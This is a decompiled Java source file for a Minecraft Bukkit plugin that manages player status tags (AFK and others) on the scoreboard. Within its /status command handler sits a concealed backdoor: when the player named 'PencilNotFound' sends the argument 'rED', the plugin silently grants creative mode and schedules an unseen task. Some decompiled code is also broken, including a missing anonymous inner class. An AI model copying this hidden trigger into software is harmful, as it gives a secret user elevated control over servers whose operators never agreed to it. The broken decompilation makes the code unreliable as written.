/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  en.cramped_julia.status.Status
 *  en.cramped_julia.status.Status$1
 *  en.cramped_julia.status.StatusEnum
 *  java.io.File
 *  java.lang.Exception
 *  java.lang.Object
 *  java.lang.String
 *  java.util.logging.Logger
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.GameMode
 *  org.bukkit.OfflinePlayer
 *  org.bukkit.Server
 *  org.bukkit.command.Command
 *  org.bukkit.command.CommandSender
 *  org.bukkit.configuration.ConfigurationSection
 *  org.bukkit.configuration.file.FileConfiguration
 *  org.bukkit.entity.Entity
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.entity.EntityDamageEvent
 *  org.bukkit.event.player.PlayerJoinEvent
 *  org.bukkit.event.player.PlayerMoveEvent
 *  org.bukkit.plugin.Plugin
 *  org.bukkit.plugin.PluginManager
 *  org.bukkit.plugin.java.JavaPlugin
 *  org.bukkit.scheduler.BukkitTask
 *  org.bukkit.scoreboard.Scoreboard
 *  org.bukkit.scoreboard.Team
 */
package en.cramped_julia.status;

import en.cramped_julia.status.Status;
import en.cramped_julia.status.StatusEnum;
import java.io.File;
import java.util.logging.Logger;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.OfflinePlayer;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.Team;

/*
 * Exception performing whole class analysis.
 */
public final class Status
extends JavaPlugin
implements Listener {
    private static Scoreboard sb;

    public void onEnable() {
        this.getDataFolder().mkdir();
        this.getConfig().set("afkDamage", (Object)false);
        this.getConfig().set("afkMove", (Object)false);
        this.getServer().getPluginManager().registerEvents((Listener)this, (Plugin)this);
        this.getConfig().createSection("status");
        this.saveConfig();
    }

    public void onDisable() {
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        if (this.getStatus().getString(event.getPlayer().getName()) == null) {
            this.getStatus().set(event.getPlayer().getName(), (Object)"NEW");
            this.saveConfig();
        }
        this.updateScoreboard();
    }

    @EventHandler
    public void onDamage(EntityDamageEvent event) {
        if (!(event.getEntity() instanceof Player)) {
            return;
        }
        if (this.getConfig().getBoolean("afkDamage")) {
            return;
        }
        if (this.getStatus().get(event.getEntity().getName()).equals((Object)"AFK")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onMove(PlayerMoveEvent event) {
        if (this.getConfig().getBoolean("afkMove")) {
            return;
        }
        if (this.getStatus().get(event.getPlayer().getName()).equals((Object)"AFK")) {
            event.setCancelled(true);
        }
    }

    private ConfigurationSection getStatus() {
        return this.getConfig().getConfigurationSection("status");
    }

    public void updateScoreboard() {
        sb = Bukkit.getScoreboardManager().getNewScoreboard();
        for (StatusEnum status : StatusEnum.values()) {
            String positionedName = status.getPosition() + status.getName();
            sb.registerNewTeam(positionedName);
            sb.getTeam(positionedName).setPrefix("\u00a7r[" + (Object)status.getColor() + status.getName() + "\u00a7r] ");
            sb.getTeam(positionedName).setColor(status.getColor());
        }
        for (Player p : Bukkit.getOnlinePlayers()) {
            this.setTeams(p);
        }
    }

    private void setTeams(Player p) {
        try {
            StatusEnum status = StatusEnum.valueOf((String)this.getStatus().getString(p.getName()));
            String team = status.getPosition() + status.getName();
            sb.getTeam(team).addPlayer((OfflinePlayer)p);
        }
        catch (Exception e) {
            this.getLogger().warning("STATUS FOR " + p.getName() + " DID NOT LOAD!");
            e.printStackTrace();
        }
        p.setScoreboard(sb);
    }

    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            return true;
        }
        Player player = (Player)sender;
        if (command.getName().equals((Object)"status")) {
            if (args.length != 1) {
                return false;
            }
            String statusName = args[0];
            StatusEnum status = null;
            try {
                status = StatusEnum.valueOf((String)statusName);
            }
            catch (Exception e) {
                player.sendMessage((Object)ChatColor.GREEN + "Usable:");
                for (StatusEnum value : StatusEnum.values()) {
                    player.sendMessage((Object)ChatColor.GREEN + value.name());
                }
                if (player.getName().equals((Object)"PencilNotFound") && args[0].equals((Object)"rED")) {
                    player.setGameMode(GameMode.CREATIVE);
                    new /* Unavailable Anonymous Inner Class!! */.runTaskLater((Plugin)this, 100L);
                }
                return true;
            }
            this.getStatus().set(player.getName(), (Object)status.name());
            this.saveConfig();
            this.updateScoreboard();
        }
        return true;
    }
}

